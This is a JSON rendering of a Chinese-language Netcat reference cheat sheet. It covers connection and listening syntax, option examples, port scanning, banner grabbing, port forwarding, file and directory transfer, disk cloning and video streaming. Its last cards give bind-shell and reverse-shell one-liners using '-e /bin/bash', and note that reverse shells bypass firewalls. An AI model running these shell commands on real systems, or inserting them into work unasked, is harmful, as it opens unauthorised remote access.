{
  "id": "netcat",
  "name": "Netcat 备忘清单",
  "title": "该备忘单提供了在 Linux 和 Unix 上使用 Netcat 的各种方法。",
  "icon": "https://raw.githubusercontent.com/jaywcjlove/reference/main/assets/netcat.svg",
  "sections": [
    {
      "id": "intro",
      "title": "简介",
      "startIndex": 0
    },
    {
      "id": "s1",
      "title": "入门",
      "startIndex": 1
    },
    {
      "id": "s2",
      "title": "Netcat 示例",
      "startIndex": 10
    }
  ],
  "cards": [
    {
      "id": "intro-0",
      "sectionId": "intro",
      "title": "简介",
      "kind": "text",
      "body": "该备忘单提供了在 Linux 和 Unix 上使用 Netcat 的各种方法。"
    },
    {
      "id": "s1-1",
      "sectionId": "s1",
      "title": "用法",
      "kind": "text",
      "body": "连接到位于任何地方的主机"
    },
    {
      "id": "s1-2",
      "sectionId": "s1",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc [options] [host] [port]"
    },
    {
      "id": "s1-3",
      "sectionId": "s1",
      "title": "",
      "kind": "text",
      "body": "监听传入连接"
    },
    {
      "id": "s1-4",
      "sectionId": "s1",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -lp port [host] [port]"
    },
    {
      "id": "s1-5",
      "sectionId": "s1",
      "title": "选项示例",
      "kind": "text",
      "body": "选项 | 示例 | 说明\n:- | :- | :-\n`-h`   | nc -h                      | 帮助\n`-z`   | nc -z 192.168.1.9 1-100    | 端口扫描主机或 `IP` 地址\n`-v`   | nc -zv 192.168.1.9 1-100   | 提供详细输出\n`-n`   | nc -zn 192.168.1.9 1-100   | 通过禁用 `DNS` 解析进行快速扫描\n`-l`   | nc -lp 8000                | `TCP` 侦听模式 _(用于入站连接)_\n`-w`   | nc -w 180 192.168.1.9 8000 | 定义超时值\n`-k`   | nc -kl 8000                | 断线后继续收听\n`-u`   | nc -u 192.168.1.9 8000     | 使用 `UDP` 而不是 `TCP`\n`-q`   | nc -q 1 192.168.1.9 8000   | 客户在 `EOF` 后熬夜\n`-4`   | nc -4 -l 8000              | 仅限 `IPv4`\n`-6`   | nc -6 -l 8000              | 仅限 `IPv6`"
    },
    {
      "id": "s1-6",
      "sectionId": "s1",
      "title": "聊天客户端-服务器",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s1-7",
      "sectionId": "s1",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -lv 8000"
    },
    {
      "id": "s1-8",
      "sectionId": "s1",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s1-9",
      "sectionId": "s1",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc 192.168.1.9 8000"
    },
    {
      "id": "s2-10",
      "sectionId": "s2",
      "title": "Banner 抓取",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc website.com 80\nGET index.html HTTP/1.1\nHEAD / HTTP/1.1"
    },
    {
      "id": "s2-11",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "或者"
    },
    {
      "id": "s2-12",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "echo%20%22%22%20%7C%20nc%20-zv%20-wl%20192.168.1.1%20801-805",
      "encoded": true
    },
    {
      "id": "s2-13",
      "sectionId": "s2",
      "title": "端口扫描",
      "kind": "text",
      "body": "扫描 `21` 到 `25` 之间的端口"
    },
    {
      "id": "s2-14",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -zvn 192.168.1.1 21-25"
    },
    {
      "id": "s2-15",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "扫描端口 `22`、`3306` 和 `8080`"
    },
    {
      "id": "s2-16",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -zvn 192.168.1.1 22 3306 8080"
    },
    {
      "id": "s2-17",
      "sectionId": "s2",
      "title": "%E4%BB%A3%E7%90%86%E5%92%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91",
      "kind": "code",
      "lang": "shell",
      "code": "%24%20nc%20-lp%208001%20-c%20%22nc%20127.0.0.1%208000%22",
      "encoded": true
    },
    {
      "id": "s2-18",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "或者"
    },
    {
      "id": "s2-19",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -l 8001 | nc 127.0.0.1 8000"
    },
    {
      "id": "s2-20",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "创建从一个本地端口到另一个本地端口的隧道"
    },
    {
      "id": "s2-21",
      "sectionId": "s2",
      "title": "下载文件",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s2-22",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -lv 8000 < file.txt"
    },
    {
      "id": "s2-23",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s2-24",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -nv 192.168.1.9 8000 > file.txt"
    },
    {
      "id": "s2-25",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "假设您想将文件 `file.txt` 从服务器 A 传输到客户端 B。"
    },
    {
      "id": "s2-26",
      "sectionId": "s2",
      "title": "上传文件",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s2-27",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -lv 8000 > file.txt"
    },
    {
      "id": "s2-28",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s2-29",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc 192.168.1.9 8000 < file.txt"
    },
    {
      "id": "s2-30",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "假设您想将文件 `file.txt` 从客户端 `B` 传输到服务器 `A`"
    },
    {
      "id": "s2-31",
      "sectionId": "s2",
      "title": "目录传输",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s2-32",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ tar -cvf – dir_name | nc -l 8000"
    },
    {
      "id": "s2-33",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s2-34",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -n 192.168.1.9 8000 | tar -xvf -"
    },
    {
      "id": "s2-35",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "假设您想通过网络将目录从 `A` 传输到 `B`"
    },
    {
      "id": "s2-36",
      "sectionId": "s2",
      "title": "加密传输",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s2-37",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -l 8000 | openssl enc -d -des3 -pass pass:password > file.txt"
    },
    {
      "id": "s2-38",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s2-39",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ openssl enc -des3 -pass pass:password | nc 192.168.1.9 8000"
    },
    {
      "id": "s2-40",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "在通过网络传输之前加密数据"
    },
    {
      "id": "s2-41",
      "sectionId": "s2",
      "title": "克隆",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s2-42",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ dd if=/dev/sda | nc -l 8000"
    },
    {
      "id": "s2-43",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s2-44",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -n 192.168.1.9 8000 | dd of=/dev/sda"
    },
    {
      "id": "s2-45",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "克隆 linux PC 非常简单。假设你的系统盘是 /dev/sda"
    },
    {
      "id": "s2-46",
      "sectionId": "s2",
      "title": "视频流",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s2-47",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ cat video.avi | nc -l 8000"
    },
    {
      "id": "s2-48",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s2-49",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -"
    },
    {
      "id": "s2-50",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "使用 netcat 流式传输视频"
    },
    {
      "id": "s2-51",
      "sectionId": "s2",
      "title": "远程 shell",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s2-52",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -lv 8000 -e /bin/bash"
    },
    {
      "id": "s2-53",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s2-54",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc 192.168.1.9 8000"
    },
    {
      "id": "s2-55",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "我们已经使用 `telnet` 和 `ssh` 使用远程 `Shell`，但是如果它们没有安装并且我们没有安装它们的权限，那么我们也可以使用 `netcat` 创建远程 `shell`"
    },
    {
      "id": "s2-56",
      "sectionId": "s2",
      "title": "逆转 shell",
      "kind": "text",
      "body": "服务器 Server (192.168.1.9)"
    },
    {
      "id": "s2-57",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc -lv 8000"
    },
    {
      "id": "s2-58",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "客户端 Client"
    },
    {
      "id": "s2-59",
      "sectionId": "s2",
      "title": "",
      "kind": "code",
      "lang": "shell",
      "code": "$ nc 192.168.1.9 8000 -v -e /bin/bash"
    },
    {
      "id": "s2-60",
      "sectionId": "s2",
      "title": "",
      "kind": "text",
      "body": "反向 `shell` 通常用于绕过防火墙限制，例如阻止入站连接"
    }
  ],
  "source": {
    "repo": "https://github.com/jaywcjlove/reference",
    "path": "docs/netcat.md",
    "ref": "main",
    "url": "https://github.com/jaywcjlove/reference/tree/main/docs/netcat.md",
    "lang": "zh",
    "mode": "local"
  }
}